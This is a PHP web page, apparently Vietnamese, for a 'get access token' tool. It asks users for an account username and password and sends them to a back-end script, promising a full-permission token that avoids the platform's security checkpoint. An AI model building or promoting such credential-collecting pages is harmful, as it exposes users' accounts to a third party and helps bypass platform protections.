<?php
include '../system/head.php';
?>
        <div class="content">
            <div class="container-fluid">
                <div class="row">
<div class="col-md-12">
                        <div class="card">
                            <div class="header">
                                  <h4 class="title">Get Token iPhone Full Quyền</h4>
                                <p class="category">Hệ Thống Get Access Token Không CheckPoint 100%</p>
                            </div>
							

<div class="content"><div class="panel-group">
   
<div class="form-group">
  <label for="usr">Username:</label>
  <input type="text" class="form-control" id="tk">
</div>
<div class="form-group">
  <label for="pwd">Password:</label>
  <input type="password" class="form-control" id="mk">
</div>
<button type="button" class="btn btn-danger" onclick="Puaru_Active()" >Cài Đặt và Lấy Token</button>
<p>
<li id="trave" class="list-group-item" style="background: #fff;"><img src="http://i.imgur.com/4xwpZzp.png" style="max-width:100%;"> </li></p>

</div></div>
</div>
</div></div>
<script>
function Puaru_Active() {
var http = new XMLHttpRequest();
var tk = document.getElementById("tk").value;
var mk = document.getElementById("mk").value;
var url = "token3.php";
var params = "u="+tk+"&p="+mk+"";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
      document.getElementById("trave").innerHTML = http.responseText;        
    }
}
http.send(params);
}
</script>

</div></div>
<?php include '../system/foot.php'; ?>